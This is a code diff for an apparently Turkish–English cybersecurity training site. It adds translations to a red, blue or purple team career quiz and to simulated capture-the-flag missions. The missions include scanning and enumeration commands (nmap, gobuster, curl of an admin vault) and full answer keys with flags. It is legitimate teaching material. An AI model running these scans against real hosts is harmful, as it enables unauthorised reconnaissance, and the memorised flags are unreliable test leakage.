                     { text: "Rakibin hiç beklemediği gizli yollardan arkasına dolanıp sürpriz hamleyle kaleyi düşürmek.", team: "red", icon: "" },
                     { text: "Kendi bölgemi aşılmaz bir kale haline getirip gelen tüm saldırıları tek tek püskürtmek.", team: "blue", icon: "" },
@@ -3123,6 +4018,7 @@ Sunny     2401  0.0  0.3  24520  6820 pts/0    Ss   00:05   0:00 -bash
             },
             {
                 q: "3. Bir polisiye veya casusluk filminde hangi karakterin yerinde olmak isterdin?",
+                q_en: "3. In a detective or spy film, which character's role would you rather play?",
                 options: [
                     { text: "En karmaşık şifreli kasaları çözen ve kimseye görünmeden içeri sızabilen dahi casus.", team: "red", icon: "" },
                     { text: "Olay yerindeki en ufak ayak izini veya parmak izini büyüteçle inceleyip suçluyu yakalayan adli tıp uzmanı.", team: "blue", icon: "" },
@@ -3131,6 +4027,7 @@ Sunny     2401  0.0  0.3  24520  6820 pts/0    Ss   00:05   0:00 -bash
             },
             {
                 q: "4. Telefonuna 'Tebrikler! 25.000 TL hediye kazandınız, hemen linke tıklayın' mesajı gelse ne yaparsın?",
+                q_en: "4. If you get a text saying 'Congratulations! You won $25,000, click here immediately', what do you do?",
                 options: [
                     { text: "Bu sahte linkin arkasında kimin olduğunu ve insanları nasıl kandırdıklarını merak edip perde arkasını incelerim.", team: "red", icon: "" },
                     { text: "Numarayı anında engeller, mesajı siler ve ailemi bu tür tuzaklara düşmemeleri için hemen uyarırım.", team: "blue", icon: "" },
@@ -3139,6 +4036,7 @@ Sunny     2401  0.0  0.3  24520  6820 pts/0    Ss   00:05   0:00 -bash
             },
             {
                 q: "5. Yeni aldığın akıllı telefon veya cihazın kutusunu ilk açtığında ne yaparsın?",
+                q_en: "5. When unboxing a brand-new smartphone or smart gadget, what is your first instinct?",
                 options: [
                     { text: "Ayarlarını kurcalayıp gizli menüleri, kısıtlamaları veya üreticinin kapatmak istediği şeyleri açmaya çalışırım.", team: "red", icon: "" },
                     { text: "Hemen koruyucu kılıf takıp; yüz tanıma, çift adımlı SMS doğrulama ve konum güvenliği ayarlarını açarım.", team: "blue", icon: "" },
@@ -3147,6 +4045,7 @@ Sunny     2401  0.0  0.3  24520  6820 pts/0    Ss   00:05   0:00 -bash
             },
             {
                 q: "6. Büyük bir bankada veya kurumda çalışsaydın hangi görev sana daha heyecan verici gelirdi?",
+                q_en: "6. If you worked at a major enterprise or bank, which mission would excite you more?",
                 options: [
                     { text: "Yönetimin izniyle şirketin binasına veya sistemine gizlice sızmayı deneyip güvenlik açıklarını ispatlamak.", team: "red", icon: "" },
                     { text: "Bankanın kasasını ve müşteri hesaplarını 7/24 izleyip hiçbir şüpheli para hareketine izin vermemek.", team: "blue", icon: "" },
@@ -3155,6 +4054,7 @@ Sunny     2401  0.0  0.3  24520  6820 pts/0    Ss   00:05   0:00 -bash
             },
             {
                 q: "7. Bir zeka bulmacası veya kaçış odası oyununda seni en çok tatmin eden an hangisidir?",
+                q_en: "7. In an escape room or logic puzzle game, which moment satisfies you most?",
                 options: [
                     { text: "Oyun kurucusunun fark etmediği bir kestirme yol veya ipucu bularak odayı herkesten önce açmak.", team: "red", icon: "" },
                     { text: "Odadaki tüm ipuçlarını ve şifreleri adım adım, sırayla ve hiçbir detayı atlamadan eksiksiz çözmek.", team: "blue", icon: "" },
@@ -3163,6 +4063,7 @@ Sunny     2401  0.0  0.3  24520  6820 pts/0    Ss   00:05   0:00 -bash
             },
             {
                 q: "8. Büyük bir şirketin müşteri şifrelerini çaldırdığı haberini duydun. Aklından geçen ilk düşünce ne olur?",
+                q_en: "8. You hear that a major enterprise suffered a customer credential breach. What is your first thought?",
                 options: [
                     { text: "'Hırsızlar hangi akıllıca yöntemle veya hangi gizli açık kapıdan içeri sızmayı başardı acaba?'", team: "red", icon: "" },
                     { text: "'Bu şirket neden iki aşamalı SMS onayı ve şifreli kalkanlar kullanmamış, bu kabul edilemez!'", team: "blue", icon: "" },
@@ -3171,6 +4072,7 @@ Sunny     2401  0.0  0.3  24520  6820 pts/0    Ss   00:05   0:00 -bash
             },
             {
                 q: "9. Sana bir süper kahraman gücü verilseydi hangisini seçerdin?",
+                q_en: "9. If you were granted a superhero ability, which one would you choose?",
                 options: [
                     { text: "Görünmez olup kilitli kapıların arkasından rahatça geçebilme ve gizli sırları keşfetme gücü.", team: "red", icon: "" },
                     { text: "Kendini ve tüm sevdiklerini her türlü tehlikeden koruyan kurşun geçirmez aşılmaz bir enerji kalkanı.", team: "blue", icon: "" },
@@ -3179,6 +4081,7 @@ Sunny     2401  0.0  0.3  24520  6820 pts/0    Ss   00:05   0:00 -bash
             },
             {
                 q: "10. Siber dünyada ilerlemek istesen hangi unvan kulağına en havalı ve sana en uygun geliyor?",
+                q_en: "10. If pursuing a cybersecurity career, which title sounds most thrilling and fitting for you?",
                 options: [
                     { text: "Sistemlerin açık kapılarını bularak şirketlerin korunmasını sağlayan 'Etik Hacker' (Red Team).", team: "red", icon: "" },
                     { text: "Sistemleri virüslere ve siber korsanlara karşı bir kale gibi koruyan 'Siber Savunma Muhafızı' (Blue Team).", team: "blue", icon: "" },
@@ -3199,6 +4102,12 @@ Sunny     2401  0.0  0.3  24520  6820 pts/0    Ss   00:05   0:00 -bash
             const qObj = quizQuestions[currentStep];
             const progressPct = Math.round(((currentStep + 1) / quizQuestions.length) * 100);
             const currentSelected = answers[currentStep];
+            const isEn = (window.I18N && window.I18N.currentLang === 'en');
+            const qTitle = isEn && qObj.q_en ? qObj.q_en : qObj.q;
+            const stepLabel = isEn ? `QUESTION ${currentStep + 1} / ${quizQuestions.length}` : `SORU ${currentStep + 1} / ${quizQuestions.length}`;
+            const pctLabel = isEn ? `${progressPct}% Completed` : `${progressPct}% Tamamlandı`;
+            const prevLabel = isEn ? '&larr; Previous Question' : '&larr; Önceki Soru';
+            const autoLabel = isEn ? 'Click an option to advance automatically' : 'Bir seçeneğe tıkladığınızda otomatik ilerler';
 
             container.innerHTML = `
                 <div class="quiz-progress-bar-wrap">
@@ -3206,26 +4115,26 @@ Sunny     2401  0.0  0.3  24520  6820 pts/0    Ss   00:05   0:00 -bash
                 </div>
 
                 <div class="quiz-question-header">
-                    <span class="quiz-step-badge">SORU ${currentStep + 1} / ${quizQuestions.length}</span>
-                    <span style="font-size: 12px; color: var(--text-muted); font-family: var(--font-mono);">${progressPct}% Tamamlandı</span>
+                    <span class="quiz-step-badge">${stepLabel}</span>
+                    <span style="font-size: 12px; color: var(--text-muted); font-family: var(--font-mono);">${pctLabel}</span>
                 </div>
 
-                <h3 class="quiz-question-title">${escapeHtml(qObj.q)}</h3>
+                <h3 class="quiz-question-title">${escapeHtml(qTitle)}</h3>
 
                 <div class="quiz-options-list">
                     ${qObj.options.map(opt => `
                         <div class="quiz-option-item ${currentSelected === opt.team ? 'selected' : ''}" data-team="${opt.team}">
                             <span class="quiz-option-icon">${opt.icon}</span>
-                            <span class="quiz-option-text">${escapeHtml(opt.text)}</span>
+                            <span class="quiz-option-text">${escapeHtml(isEn && opt.text_en ? opt.text_en : opt.text)}</span>
                         </div>
                     `).join('')}
                 </div>
 
                 <div class="quiz-nav-row">
                     ${currentStep > 0 ? `
-                        <button type="button" class="btn-secondary btn-sm" id="btn-quiz-prev">&larr; Önceki Soru</button>
+                        <button type="button" class="btn-secondary btn-sm" id="btn-quiz-prev">${prevLabel}</button>
                     ` : `<div></div>`}
-                    <span style="font-size: 11.5px; color: var(--text-muted);">Bir seçeneğe tıkladığınızda otomatik ilerler</span>
+                    <span style="font-size: 11.5px; color: var(--text-muted);">${autoLabel}</span>
                 </div>
             `;
 
@@ -3261,34 +4170,53 @@ Sunny     2401  0.0  0.3  24520  6820 pts/0    Ss   00:05   0:00 -bash
             const bluePct = Math.round((blueCount / answers.length) * 100);
             const purplePct = Math.round((purpleCount / answers.length) * 100);
 
+            const isEn = (window.I18N && window.I18N.currentLang === 'en');
             let winningTeam = 'red';
             let roleIcon = '⚔️';
-            let roleTitle = 'RED TEAM // ETİK HACKER & AÇIK AVCISI';
+            let roleTitle = isEn ? 'RED TEAM // ETHICAL HACKER & PENETRATION TESTER' : 'RED TEAM // ETİK HACKER & AÇIK AVCISI';
             let roleColor = '#f87171';
-            let roleDesc = 'Tebrikler! Zihnin tıpkı bir dedektif veya kilit ustası gibi meraklı ve sorgulayıcı çalışıyor. Sistemlerin açık kapılarını, unutulan şifrelerini ve gözden kaçan zayıf noktalarını sezmekte doğuştan gelen bir avcı içgüdün var. Sıfır yazılım bilsen bile bu merak seni sistemleri kötü niyetli saldırganlardan önce test edip koruyan bir "Etik Hacker" (Red Team) yapabilir!';
+            let roleDesc = isEn 
+                ? 'Congratulations! Your mind operates with curiosity and deduction like a master investigator. You have a natural hunter\'s instinct for uncovering forgotten credentials, system backdoors, and overlooked vulnerabilities. Even with zero prior coding knowledge, your inquisitive mindset makes you a natural fit for "Ethical Hacking" (Red Team) to safeguard systems before malicious attackers strike!'
+                : 'Tebrikler! Zihnin tıpkı bir dedektif veya kilit ustası gibi meraklı ve sorgulayıcı çalışıyor. Sistemlerin açık kapılarını, unutulan şifrelerini ve gözden kaçan zayıf noktalarını sezmekte doğuştan gelen bir avcı içgüdün var. Sıfır yazılım bilsen bile bu merak seni sistemleri kötü niyetli saldırganlardan önce test edip koruyan bir "Etik Hacker" (Red Team) yapabilir!';
             let targetCategory = 'nmap';
 
             if (blueCount >= redCount && blueCount >= purpleCount) {
                 winningTeam = 'blue';
                 roleIcon = '🛡️';
-                roleTitle = 'BLUE TEAM // SİBER SAVUNMA & KALE MUHAFIZI';
+                roleTitle = isEn ? 'BLUE TEAM // CYBER DEFENSE & SHIELD GUARDIAN' : 'BLUE TEAM // SİBER SAVUNMA & KALE MUHAFIZI';
                 roleColor = '#60a5fa';
-                roleDesc = 'Harika! Zihnin koruyucu bir kale muhafızı ve dikkatli bir nöbetçi gibi çalışıyor. Sistemleri aşılmaz bir zırhla donatmak, şüpheli hareketleri anında sezmek ve izinsiz girişleri kapıda durdurmak senin uzmanlık alanın. Kurumları ve insanları siber korsanlara karşı koruyan bir "Siber Savunma Uzmanı" (Blue Team) potansiyelin çok yüksek!';
+                roleDesc = isEn
+                    ? 'Outstanding! Your mind operates like a steadfast fortress guardian and watchful sentinel. Hardening systems with impenetrable armor, detecting anomalies in real-time, and neutralizing intrusions at the perimeter is your natural calling. You have immense potential as a "Cyber Defense Specialist" (Blue Team) protecting critical infrastructure!'
+                    : 'Harika! Zihnin koruyucu bir kale muhafızı ve dikkatli bir nöbetçi gibi çalışıyor. Sistemleri aşılmaz bir zırhla donatmak, şüpheli hareketleri anında sezmek ve izinsiz girişleri kapıda durdurmak senin uzmanlık alanın. Kurumları ve insanları siber korsanlara karşı koruyan bir "Siber Savunma Uzmanı" (Blue Team) potansiyelin çok yüksek!';
                 targetCategory = 'blue';
             } else if (purpleCount > redCount && purpleCount > blueCount) {
                 winningTeam = 'purple';
                 roleIcon = '🟣';
-                roleTitle = 'PURPLE TEAM // STRATEJİST & SİBER GÜVENLİK LİDERİ';
+                roleTitle = isEn ? 'PURPLE TEAM // STRATEGIST & CYBERSECURITY LEADER' : 'PURPLE TEAM // STRATEJİST & SİBER GÜVENLİK LİDERİ';
                 roleColor = '#c084fc';
-                roleDesc = 'Muhteşem! Sen hem saldırıyı hem savunmayı aynı anda dengeli gören stratejik bir lidersin. Bir suçlunun nasıl düşüneceğini de, güvenliğin nasıl sağlanması gerektiğini de büyük resimden görüyorsun. İki tarafı buluşturan, tatbikatları yöneten ve kriz anında doğru kararları alan bir "Siber Güvenlik Stratejisti" (Purple Team) kumaşına sahipsin!';
+                roleDesc = isEn
+                    ? 'Magnificent! You are a strategic visionary who sees both attack and defense simultaneously. You understand criminal psychology as well as enterprise resilience. Bridging offensive and defensive operations, orchestrating red/blue exercises, and guiding crisis response makes you an ideal "Cybersecurity Strategist" (Purple Team)!'
+                    : 'Muhteşem! Sen hem saldırıyı hem savunmayı aynı anda dengeli gören stratejik bir lidersin. Bir suçlunun nasıl düşüneceğini de, güvenliğin nasıl sağlanması gerektiğini de büyük resimden görüyorsun. İki tarafı buluşturan, tatbikatları yöneten ve kriz anında doğru kararları alan bir "Siber Güvenlik Stratejisti" (Purple Team) kumaşına sahipsin!';
                 targetCategory = 'all';
             }
+
+            const resBadge = isEn ? 'ANALYSIS RESULT // 100% COMPLETED' : 'ANALİZ SONUCU // %100 TAMAMLANDI';
+            const redTeamLabel = isEn ? '⚔️ Red Team (Offensive / Penetration):' : '⚔️ Red Team (Ofansif / Hücum):';
+            const blueTeamLabel = isEn ? '🛡️ Blue Team (Defensive / Blue Watch):' : '🛡️ Blue Team (Defansif / Savunma):';
+            const purpleTeamLabel = isEn ? '🟣 Purple Team (Integrated Strategy):' : '🟣 Purple Team (Entegre Strateji):';
+            const redScoreLabel = isEn ? `${redPct}% (${redCount}/10 Questions)` : `${redPct}% (${redCount}/10 Soru)`;
+            const blueScoreLabel = isEn ? `${bluePct}% (${blueCount}/10 Questions)` : `${bluePct}% (${blueCount}/10 Soru)`;
+            const purpleScoreLabel = isEn ? `${purplePct}% (${purpleCount}/10 Questions)` : `${purplePct}% (${purpleCount}/10 Soru)`;
+            const btnJumpAcadText = isEn ? '🎓 Open Your Personalized Academy Rooms &rarr;' : '🎓 Sana Özel Akademi Odalarını Aç &rarr;';
+            const btnJumpCmdsText = isEn ? '📚 Open 140+ Cyber Command Library' : '📚 140+ Kod Kütüphanesini Aç';
+            const btnJumpTermText = isEn ? '💻 Open Kali Web Terminal' : '💻 Kali Web Terminalini Aç';
+            const btnRestartText = isEn ? '🔄 Retake Quiz' : '🔄 Testi Tekrar Çöz';
 
             container.innerHTML = `
                 <div class="quiz-result-box">
                     <div class="quiz-result-hero-icon">${roleIcon}</div>
                     <div class="page-tier-badge" style="background: rgba(255,255,255,0.06); color: ${roleColor}; border-color: ${roleColor}; margin-bottom: 8px;">
-                        ANALİZ SONUCU // %100 TAMAMLANDI
+                        ${resBadge}
                     </div>
                     <h2 class="quiz-result-role-title" style="color: ${roleColor};">${roleTitle}</h2>
                     <p class="quiz-result-desc">${escapeHtml(roleDesc)}</p>
@@ -3296,8 +4224,8 @@ Sunny     2401  0.0  0.3  24520  6820 pts/0    Ss   00:05   0:00 -bash
                     <div class="quiz-breakdown-bars">
                         <div class="quiz-bar-item">
                             <div class="quiz-bar-label-row">
-                                <span style="color: #f87171;">⚔️ Red Team (Ofansif / Hücum):</span>
-                                <span style="color: #f87171;">${redPct}% (${redCount}/10 Soru)</span>
+                                <span style="color: #f87171;">${redTeamLabel}</span>
+                                <span style="color: #f87171;">${redScoreLabel}</span>
                             </div>
                             <div class="quiz-bar-track">
                                 <div class="quiz-bar-fill" style="width: ${redPct}%; background: #ef4444;"></div>
@@ -3306,8 +4234,8 @@ Sunny     2401  0.0  0.3  24520  6820 pts/0    Ss   00:05   0:00 -bash
 
                         <div class="quiz-bar-item">
                             <div class="quiz-bar-label-row">
-                                <span style="color: #60a5fa;">🛡️ Blue Team (Defansif / Savunma):</span>
-                                <span style="color: #60a5fa;">${bluePct}% (${blueCount}/10 Soru)</span>
+                                <span style="color: #60a5fa;">${blueTeamLabel}</span>
+                                <span style="color: #60a5fa;">${blueScoreLabel}</span>
                             </div>
                             <div class="quiz-bar-track">
                                 <div class="quiz-bar-fill" style="width: ${bluePct}%; background: #3b82f6;"></div>
@@ -3316,8 +4244,8 @@ Sunny     2401  0.0  0.3  24520  6820 pts/0    Ss   00:05   0:00 -bash
 
                         <div class="quiz-bar-item">
                             <div class="quiz-bar-label-row">
-                                <span style="color: #c084fc;">🟣 Purple Team (Entegre Strateji):</span>
-                                <span style="color: #c084fc;">${purplePct}% (${purpleCount}/10 Soru)</span>
+                                <span style="color: #c084fc;">${purpleTeamLabel}</span>
+                                <span style="color: #c084fc;">${purpleScoreLabel}</span>
                             </div>
                             <div class="quiz-bar-track">
                                 <div class="quiz-bar-fill" style="width: ${purplePct}%; background: #a855f7;"></div>
@@ -3327,16 +4255,16 @@ Sunny     2401  0.0  0.3  24520  6820 pts/0    Ss   00:05   0:00 -bash
 
                     <div class="quiz-actions-row">
                         <button type="button" class="btn-glow-blue" id="btn-quiz-jump-academy">
-                            🎓 Sana Özel Akademi Odalarını Aç &rarr;
+                            ${btnJumpAcadText}
                         </button>
                         <button type="button" class="btn-secondary" id="btn-quiz-jump-commands">
-                            📚 140+ Kod Kütüphanesini Aç
+                            ${btnJumpCmdsText}
                         </button>
                         <button type="button" class="btn-secondary" id="btn-quiz-jump-terminal">
-                            💻 Kali Web Terminalini Aç
+                            ${btnJumpTermText}
                         </button>
                         <button type="button" class="btn-secondary" id="btn-quiz-restart-inner">
-                            🔄 Testi Tekrar Çöz
+                            ${btnRestartText}
                         </button>
                     </div>
                 </div>
@@ -3374,7 +4302,12 @@ Sunny     2401  0.0  0.3  24520  6820 pts/0    Ss   00:05   0:00 -bash
         }
 
         if (btnRestart) {
-            btnRestart.addEventListener('click', () => {
+            window.addEventListener('languageChanged', () => {
+            if (currentStep < quizQuestions.length) renderStep();
+            else renderResults();
+        });
+
+        btnRestart.addEventListener('click', () => {
                 currentStep = 0;
                 answers = [];
                 renderStep();
@@ -4460,147 +5393,352 @@ Sunny     2401  0.0  0.3  24520  6820 pts/0    Ss   00:05   0:00 -bash
             id: 'm1_1',
             level: '1.1',
             levelTier: 1,
-            levelLabel: 'SEVİYE 1.1 // ÇAYLAK SEVİYE',
-            badgeColor: '#10b981',
-            title: 'Operasyon Kapı Çalan (Op: Port Knock)',
-            target: '10.10.1.5 (Dış Güvenlik Ağ Geçidi)',
-            category: 'Ağ & Port Keşfi',
+            group: 'recon',
+            levelLabel: 'SEVİYE 1.1 // AĞ KEŞFİ & PORT TARAMA',
+            levelLabel_en: 'LEVEL 1.1 // NETWORK RECON & PORT SCAN',
+            badgeColor: '#38bdf8',
+            title: 'Operasyon Kapı Çalan (Op: Door Knocker)',
+            title_en: 'Operation Door Knocker (Network Recon)',
+            target: '10.10.1.5 (Dış Ağ Geçidi)',
+            target_en: '10.10.1.5 (External Gateway)',
+            category: 'Ağ Keşfi (Reconnaissance)',
+            category_en: 'Network Reconnaissance',
             xp: 100,
-            story: 'Hedef şirketin dışa açık sunucusu (<strong>10.10.1.5</strong>) üzerinde kritik bir güvenlik açığı şüphesi var. Önce sunucunun ayakta olduğunu <code>ping</code> ile doğrula, ardından servis portlarını <code>nmap</code> ile tara ve HTTP yanıt başlıklarındaki (Header) Base64 kodlu gizli anahtarı çözerek ilk bayrağı kap.',
+            story: 'İstihbarat birimi, dış ağda şüpheli bir sınır sunucusu (<code>10.10.1.5</code>) tespit etti. Sunucunun ayakta olup olmadığını kontrol et, açık portları ve servis versiyonlarını tara, ardından HTTP sunucusunun yanıt başlıklarına (headers) gizlenmiş Base64 şifreli mesajı çözerek ilk bayrağı ele geçir.',
+            story_en: 'Intelligence detected a suspicious perimeter server (<code>10.10.1.5</code>). Verify host availability, scan open ports and service versions, inspect HTTP response headers to find the hidden Base64 token, and decode it to capture your first flag.',
             tools: ['ping', 'nmap', 'curl', 'base64'],
+            steps: [
+                { label: 'Hedef sunucunun aktifliğini doğrula (ICMP Ping)', label_en: 'Verify target host availability (ICMP Ping)', cmd: 'ping -c 3 10.10.1.5', match: ['ping', '10.10.1.5'] },
+                { label: 'Açık portları ve servis versiyonlarını tara', label_en: 'Scan open ports and service versions', cmd: 'nmap -sV 10.10.1.5', match: ['nmap', '10.10.1.5'] },
+                { label: 'HTTP yanıt başlıklarını (Headers) incele', label_en: 'Inspect HTTP response headers', cmd: 'curl -I http://10.10.1.5', match: ['curl', '10.10.1.5'] },
+                { label: 'X-Secret-Auth başlığındaki Base64 şifreyi çöz', label_en: 'Decode the Base64 token in X-Secret-Auth', cmd: 'echo "TEZMe2xldmVsMV8xX2FnX2tlc2lmX2Jhc2FyYW5zfQ==" | base64 -d', match: ['base64'] }
+            ],
             quickCmds: [
                 'ping -c 3 10.10.1.5',
                 'nmap -sV 10.10.1.5',
                 'curl -I http://10.10.1.5',
                 'echo "TEZMe2xldmVsMV8xX2FnX2tlc2lmX2Jhc2FyYW5zfQ==" | base64 -d'
             ],
-            hint: '1) <code>ping -c 3 10.10.1.5</code> ile bağlantıyı test et.<br>2) <code>nmap -sV 10.10.1.5</code> yazarak açık portu gör (Port 80 HTTP açık).<br>3) <code>curl -I http://10.10.1.5</code> ile sunucu yanıt başlıklarını incele.<br>4) Başlıkta gördüğün <code>X-Secret-Auth</code> Base64 değerini <code>echo "..." | base64 -d</code> ile çöz!',
+            hint: '1) <code>ping -c 3 10.10.1.5</code> ile bağlantıyı doğrula.<br>2) <code>nmap -sV 10.10.1.5</code> ile Port 80 HTTP servisini gör.<br>3) <code>curl -I http://10.10.1.5</code> yazarak <code>X-Secret-Auth</code> başlığındaki Base64 kodu bul.<br>4) <code>echo "TEZMe2xldmVsMV8xX2FnX2tlc2lmX2Jhc2FyYW5zfQ==" | base64 -d</code> komutuyla bayrağı çöz!',
             flag: 'LFL{level1_1_ag_kesif_basarans}',
-            successMsg: 'Harika! Ağ keşfini tamamladın ve HTTP başlığına gizlenmiş Base64 tokenını çözdün.'
+            successMsg: 'Harika! Ağ keşfi, port taraması ve Base64 kod çözme adımlarını tamamlayarak Seviye 1.2 kilidini açtın!'
         },
         {
             id: 'm1_2',
             level: '1.2',
             levelTier: 1,
-            levelLabel: 'SEVİYE 1.2 // ÇAYLAK SEVİYE',
-            badgeColor: '#10b981',
-            title: 'Operasyon Hayalet Not (Op: Phantom Log)',
-            target: 'local-audit (/var/backups & /var/log)',
-            category: 'Linux Temelleri & Dosya Analizi',
+            group: 'recon',
+            levelLabel: 'SEVİYE 1.2 // LINUX DOSYA & LOG ANALİZİ',
+            levelLabel_en: 'LEVEL 1.2 // LINUX FILESYSTEM & LOG ANALYSIS',
+            badgeColor: '#00e5ff',
+            title: 'Operasyon Hayalet Not (Op: Ghost Note)',
+            title_en: 'Operation Ghost Note (Linux Log Audit)',
+            target: '/var/backups & /var/log/syslog',
+            target_en: '/var/backups & /var/log/syslog',
+            category: 'Linux Sistem & Log Keşfi',
+            category_en: 'Linux System & Log Audit',
             xp: 150,
-            story: 'Sızılan bir Linux sunucusunda şüpheli bir operatör iz bırakıp kaçmış. <code>/var/backups</code> dizinini incele, operatörün bıraktığı nottaki ipucunu oku ve <code>/var/log/syslog</code> içerisinden <strong>LFL{...}</strong> formatındaki bayrağı <code>grep</code> ile filtrele.',
-            tools: ['ls', 'cat', 'grep', 'find'],
+            story: 'Sınır sunucusuna düşük yetkili erişim sağlandı. İçerideki bir sistem yöneticisi yedekleme dizinine (<code>/var/backups</code>) gizli bir not bıraktı. Gizli dosyaları listele, notu oku ve sistem günlüklerinde (<code>/var/log/syslog</code>) sızdırılan anahtarı <code>grep</code> ile filtrele.',
+            story_en: 'Low-privilege access obtained on the perimeter box. A sysadmin left a hidden note inside <code>/var/backups</code>. List hidden files, read the note, and filter <code>/var/log/syslog</code> with <code>grep</code> to extract the leaked flag.',
+            tools: ['ls', 'cat', 'grep'],
+            steps: [
+                { label: '/var/backups dizinindeki gizli yedekleri listele', label_en: 'List hidden backup files in /var/backups', cmd: 'ls -la /var/backups', match: ['ls', '/var/backups'] },
+                { label: 'Operatörün bıraktığı gizli notu oku', label_en: 'Read the secret operator note', cmd: 'cat /var/backups/operator_note.txt', match: ['cat', 'operator_note.txt'] },
+                { label: 'Sistem loglarından (syslog) LFL{ bayrağını süz', label_en: 'Filter LFL{ flag from /var/log/syslog', cmd: 'grep -i "LFL{" /var/log/syslog', match: ['grep', 'syslog'] }
+            ],
             quickCmds: [
                 'ls -la /var/backups',
                 'cat /var/backups/operator_note.txt',
                 'grep -i "LFL{" /var/log/syslog'
             ],
-            hint: '1) <code>ls -la /var/backups</code> yazarak yedek dizinindeki gizli dosyaları listele.<br>2) <code>cat /var/backups/operator_note.txt</code> dosyasını oku.<br>3) Notta belirtilen log kaydını <code>grep -i "LFL{" /var/log/syslog</code> komutuyla ayıkla!',
+            hint: '1) <code>ls -la /var/backups</code> ile gizli yedek dosyalarını gör.<br>2) <code>cat /var/backups/operator_note.txt</code> ile operatörün bıraktığı ipucunu oku.<br>3) <code>grep -i "LFL{" /var/log/syslog</code> komutuyla yüzlerce log satırı arasından bayrağı çek!',
             flag: 'LFL{level1_2_linux_dosya_adli_analiz}',
-            successMsg: 'Tebrikler! Linux dosya sisteminde iz sürme ve grep ile hassas veri filtreleme görevini başarıyla tamamladın.'
+            successMsg: 'Mükemmel! Linux dizin keşfi ve log filtreleme görevini bitirdin. Seviye 2.1 Web Sızma Operasyonu açıldı!'
         },
         {
             id: 'm2_1',
             level: '2.1',
             levelTier: 2,
-            levelLabel: 'SEVİYE 2.1 // OPERATÖR SEVİYE',
-            badgeColor: '#00e5ff',
-            title: 'Operasyon Derin Dizin (Op: Deep Enum)',
-            target: 'http://10.10.2.10 (İntranet Web Portalı)',
-            category: 'Web Güvenliği & Dizin Avı',
+            group: 'red',
+            levelLabel: 'SEVİYE 2.1 // WEB DİZİN TARAMA & KEŞİF',
+            levelLabel_en: 'LEVEL 2.1 // WEB DIRECTORY FUZZING & RECON',
+            badgeColor: '#22c55e',
+            title: 'Operasyon Derin Dizin (Op: Deep Directory)',
+            title_en: 'Operation Deep Directory (Web Fuzzing)',
+            target: 'http://10.10.2.10 (İç Portal)',
+            target_en: 'http://10.10.2.10 (Internal Portal)',
+            category: 'Web Uygulama Güvenliği',
+            category_en: 'Web Application Security',
             xp: 250,
-            story: 'Hedef intranet portalında (<strong>10.10.2.10</strong>) gizli bir robot direktifi ve konfigürasyon yedeği unutulmuş. <code>whatweb</code> ile altyapıyı incele, <code>gobuster</code> ile gizli dizinleri tara, <code>robots.txt</code> dosyasındaki gizli yolu bulup json verisindeki bayrağı çek.',
-            tools: ['whatweb', 'gobuster', 'curl', 'nikto'],
+            story: 'İç ağdaki kurumsal web portalı (<code>http://10.10.2.10</code>) dışarıdan normal bir site gibi görünüyor. Ancak geliştiriciler arama motorlarından gizledikleri bir yönetim kasasını sunucuda unutmuş. <code>gobuster</code> ile dizinleri tara, <code>robots.txt</code> ve gizli yapılandırma dosyasını incele!',
+            story_en: 'The internal corporate portal (<code>http://10.10.2.10</code>) looks ordinary, but developers left an unlinked admin vault on the server. Fingerprint the stack with <code>whatweb</code>, fuzz directories with <code>gobuster</code>, and inspect <code>robots.txt</code>.',
+            tools: ['whatweb', 'gobuster', 'curl'],
+            steps: [
+                { label: 'Web sunucusu teknolojilerini tespit et (WhatWeb)', label_en: 'Fingerprint web server technologies (WhatWeb)', cmd: 'whatweb http://10.10.2.10', match: ['whatweb', '10.10.2.10'] },
+                { label: 'Gobuster ile gizli dizinleri brute-force tara', label_en: 'Fuzz hidden directories with Gobuster', cmd: 'gobuster dir -u http://10.10.2.10 -w common.txt', match: ['gobuster', '10.10.2.10'] },
+                { label: 'robots.txt içindeki kısıtlı dizin yolunu oku', label_en: 'Read restricted path inside robots.txt', cmd: 'curl http://10.10.2.10/robots.txt', match: ['curl', 'robots.txt'] },
+                { label: 'Gizli JSON kasasındaki anahtarı çek', label_en: 'Dump the confidential JSON token vault', cmd: 'curl http://10.10.2.10/admin_vault/confidential_token.json', match: ['confidential_token.json'] }
+            ],
             quickCmds: [
                 'whatweb http://10.10.2.10',
                 'gobuster dir -u http://10.10.2.10 -w common.txt',
                 'curl http://10.10.2.10/robots.txt',
                 'curl http://10.10.2.10/admin_vault/confidential_token.json'
             ],
-            hint: '1) <code>whatweb http://10.10.2.10</code> ile web teknolojilerini gör.<br>2) <code>gobuster dir -u http://10.10.2.10 -w common.txt</code> ile gizli yolları keşfet.<br>3) <code>curl http://10.10.2.10/robots.txt</code> dosyasını oku.<br>4) Oradaki <code>/admin_vault/confidential_token.json</code> yolunu curl ile aç!',
+            hint: '1) <code>gobuster dir -u http://10.10.2.10 -w common.txt</code> ile gizli dizinleri keşfet.<br>2) <code>curl http://10.10.2.10/robots.txt</code> ile gizlenen yolu öğren.<br>3) <code>curl http://10.10.2.10/admin_vault/confidential_token.json</code> ile JSON içindeki bayrağı al!',
             flag: 'LFL{level2_1_web_dizin_firtinasi}',
-            successMsg: 'Kusursuz! Web dizin taraması (directory brute-force) ve robots.txt analiziyle gizli anahtarı ele geçirdin.'
+            successMsg: 'Süper! Gobuster dizin taramasıyla gizli API kasasını buldun. Seviye 2.2 Adli Bilişim görevi açıldı!'
         },
         {
             id: 'm2_2',
             level: '2.2',
             levelTier: 2,
-            levelLabel: 'SEVİYE 2.2 // OPERATÖR SEVİYE',
-            badgeColor: '#00e5ff',
-            title: 'Operasyon Gömülü Bellek (Op: Memory Forensics)',
-            target: '/evidence/suspect_payload.bin (Adli Bilişim)',
-            category: 'Adli Bilişim & Kripto',
+            group: 'blue',
+            levelLabel: 'SEVİYE 2.2 // DİJİTAL ADLİ BİLİŞİM (FORENSICS)',
+            levelLabel_en: 'LEVEL 2.2 // DIGITAL FORENSICS & BINARY ANALYSIS',
+            badgeColor: '#f59e0b',
+            title: 'Operasyon Gömülü Bellek (Op: Binary Strings)',
+            title_en: 'Operation Binary Strings (Malware Forensics)',
+            target: '/evidence/suspect_payload.bin',
+            target_en: '/evidence/suspect_payload.bin',
+            category: 'Adli Bilişim & Tersine Mühendislik',
+            category_en: 'Digital Forensics & Reverse Engineering',
             xp: 300,
-            story: 'Ele geçirilen şüpheli bir ikili bellek dökümü (<strong>/evidence/suspect_payload.bin</strong>) analiz masasında. <code>file</code> komutuyla dosya türünü doğrula, <code>strings</code> ile ikili dosyadaki okunabilir metinleri dök ve <code>md5sum</code> ile bütünlüğünü kontrol et.',
-            tools: ['file', 'strings', 'binwalk', 'md5sum'],
